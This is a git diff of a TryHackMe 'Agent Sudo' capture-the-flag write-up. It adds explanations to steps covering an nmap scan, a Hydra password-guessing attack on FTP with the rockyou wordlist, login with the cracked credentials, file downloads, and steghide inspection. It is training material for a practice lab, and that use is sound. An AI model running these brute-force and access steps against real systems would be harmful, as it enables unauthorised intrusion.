@@ -4,11 +4,11 @@ Room link: https://tryhackme.com/room/agentsudoctf
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 7/01/2023
+This writeup was last updated: 07/02/2023
 
 # Scanning and Enumeration
 > Port Scanning Using Nmap
-1. Started up this room’s machine, as well as our AttackBox
+1. Started up this room’s machine, as well as our AttackBox on TryHackMe
 2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
 3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
 ```bash
@@ -42,7 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
 
 #
 > Inspecting the Web Pages
-4. `curl http://{TARGET IP}`
+4. `curl http://{TARGET IP}` to retrieve the data of the target's homepage 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl http://10.10.226.141
@@ -104,7 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
 
 #
 > Password Guessing Using Hydra
-12. `hydra -l {USER1} -P {WORDLIST PATH} ftp://{TARGET IP}`
+12. `hydra -l {USER1} -P {WORDLIST PATH} ftp://{TARGET IP}` to launch a password guessing attack to try to guess the password for the user we discovered, which in ended up working
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l chris -P ~/Tools/wordlists/rockyou.txt ftp://10.10.55.185
@@ -120,7 +120,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 14:02:54
 
 #
 > Scanning the Target's FTP Server
-13. `ftp {USER1}@{TARGET IP}`
+13. `ftp {USER1}@{TARGET IP}` to log in to the target's FTP server using the set of credentials that we now have
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ ftp chris@10.10.75.108 
@@ -134,11 +134,11 @@ Using binary mode to transfer files.
 ftp> 
 
 ```
-14. `ls`
-15. `get {FILE1}`
-16. `get {FILE2}`
-17. `get {FILE3}`
-18. `exit`
+14. `ls` to list the available files and directories, also known as shares, that are in the current remote directory onto our terminal, which revealed there to be three files
+15. `get {FILE1}` to retrieve the first file from the FTP server and download a copy of that file onto our local attack machine
+16. `get {FILE2}` to retrieve the second file from the FTP server and download a copy of that file onto our local attack machine
+17. `get {FILE3}` to retrieve the third file from the FTP server and download a copy of that file onto our local attack machine
+18. `exit` to terminate the FTP session and disconnect from the target's FTP server
 ```bash
 ftp> ls
 200 PORT command successful. Consider using PASV.
@@ -184,7 +184,7 @@ local: cutie.png remote: cutie.png
 ftp> exit
 221 Goodbye.
 ```
-19. cat {FILE1}
+19. `cat {FILE1}` to display the contents of the first file we downloaded from the target's FTP server onto our terminal, which displayed a message from one of the target's agents that's directed to one of its other agents
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cat To_agentJ.txt
@@ -195,7 +195,7 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 From,
 Agent C
 ```
-20. `steghide --info {FILE1}`
+20. `steghide --info {FILE2}`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ steghide --info cute-alien.jpg
